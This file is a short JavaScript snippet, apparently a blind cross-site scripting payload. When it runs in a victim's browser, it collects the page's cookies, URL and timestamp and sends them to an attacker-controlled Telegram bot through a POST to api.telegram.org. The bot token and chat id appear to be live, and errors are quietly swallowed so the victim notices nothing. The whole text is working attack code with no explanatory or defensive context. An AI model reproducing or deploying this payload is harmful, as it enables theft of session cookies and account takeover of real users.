try {
    const cookies = document.cookie || "No accessible cookies";
    const currentURL = window.location.href;
    const timestamp = new Date().toLocaleString();

    fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: "-1002002449257",
            text: `🔐 Blind XSS Report:\n\n🕒 Time: ${timestamp}\n🌐 URL: ${currentURL}\n🍪 Cookies: ${cookies}`
        })
    });
} catch (e) {
    // Prevent error from breaking the page or sandbox logging
}
